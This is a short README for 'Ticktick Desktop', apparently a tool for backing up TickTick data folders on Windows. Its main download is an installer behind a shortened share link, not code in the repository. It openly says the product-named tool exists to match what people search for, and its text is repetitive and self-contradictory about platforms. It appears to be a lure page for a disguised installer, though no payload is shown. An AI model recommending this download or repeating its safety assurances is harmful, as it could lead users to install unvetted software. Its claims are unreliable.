# Ticktick Desktop

*Keep the Ticktick data folder tidy before an update.*

## What Ticktick Desktop is

This repository is **Ticktick Desktop**, a Windows utility. Keep the Ticktick data folder tidy before an update.

Ticktick config and export files hide under AppData and Documents.

It runs on the local PC. No account, and nothing is uploaded.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Maps Ticktick data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Why it exists

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build
